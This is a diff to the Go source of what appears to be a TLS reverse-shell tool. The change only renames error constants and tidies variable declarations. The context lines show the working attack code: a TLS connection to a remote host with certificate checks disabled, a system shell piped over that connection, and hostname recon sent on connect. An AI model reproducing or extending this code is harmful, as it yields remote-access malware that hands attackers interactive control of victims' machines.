@@ -18,9 +18,9 @@ import (
 )
 
 const (
-	ERR_COULD_NOT_DECODE = 1 << iota
-	ERR_HOST_UNREACHABLE = iota
-	ERR_BAD_FINGERPRINT  = iota
+	ErrCouldNotDecode  = 1 << iota
+	ErrHostUnreachable = iota
+	ErrBadFingerprint  = iota
 )
 
 var (
@@ -36,9 +36,9 @@ func send(conn net.Conn, msg string) {
 
 func interactiveShell(conn net.Conn) {
 	var (
-		name, _                = os.Hostname()
-		prompt  string         = fmt.Sprintf("\n[%s]> ", name)
-		scanner *bufio.Scanner = bufio.NewScanner(conn)
+		name, _ = os.Hostname()
+		prompt  = fmt.Sprintf("\n[%s]> ", name)
+		scanner = bufio.NewScanner(conn)
 	)
 
 	// Print basic recon data on first connect
@@ -62,7 +62,7 @@ func interactiveShell(conn net.Conn) {
 }
 
 func runShell(conn net.Conn) {
-	var cmd *exec.Cmd = shell.GetShell()
+	cmd := shell.GetShell()
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	cmd.Stdin = conn
@@ -89,12 +89,12 @@ func initReverseShell(connectString string, fingerprint []byte) {
 
 	config := &tls.Config{InsecureSkipVerify: true}
 	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
-		os.Exit(ERR_HOST_UNREACHABLE)
+		os.Exit(ErrHostUnreachable)
 	}
 	defer conn.Close()
 
 	if ok := isValidKey(conn, fingerprint); !ok {
-		os.Exit(ERR_BAD_FINGERPRINT)
+		os.Exit(ErrBadFingerprint)
 	}
 	interactiveShell(conn)
 }
@@ -104,7 +104,7 @@ func main() {
 		fprint := strings.Replace(fingerPrint, ":", "", -1)
 		bytesFingerprint, err := hex.DecodeString(fprint)
 		if err != nil {
-			os.Exit(ERR_COULD_NOT_DECODE)
+			os.Exit(ErrCouldNotDecode)
 		}
 		initReverseShell(connectString, bytesFingerprint)
 	}
